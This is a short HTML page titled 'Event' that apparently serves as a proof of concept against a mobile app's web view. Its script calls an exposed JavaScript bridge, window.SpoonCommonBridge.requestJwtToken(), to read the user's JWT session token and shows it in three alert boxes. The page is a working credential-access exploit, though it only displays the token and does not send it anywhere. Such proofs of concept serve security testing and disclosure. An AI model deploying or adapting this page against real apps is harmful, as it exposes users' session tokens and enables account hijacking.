<!DOCTYPE html>
<html>
<head><title>Event</title></head>
<body style="background:#fff;color:#000;">
<script>
try {
  var jwt = window.SpoonCommonBridge.requestJwtToken();
  if (jwt) {
    // Split into 3 alerts for readability
    var chunkSize = Math.ceil(jwt.length / 3);
    for (var i = 0; i < 3; i++) {
      var chunk = jwt.substring(i * chunkSize, (i + 1) * chunkSize);
      alert("JWT" + (i+1) + ":" + chunk);
    }
  } else {
    alert("NO_JWT");
  }
} catch(e) {
  alert("ERR:" + e.message);
}
</script>
</body>
</html>
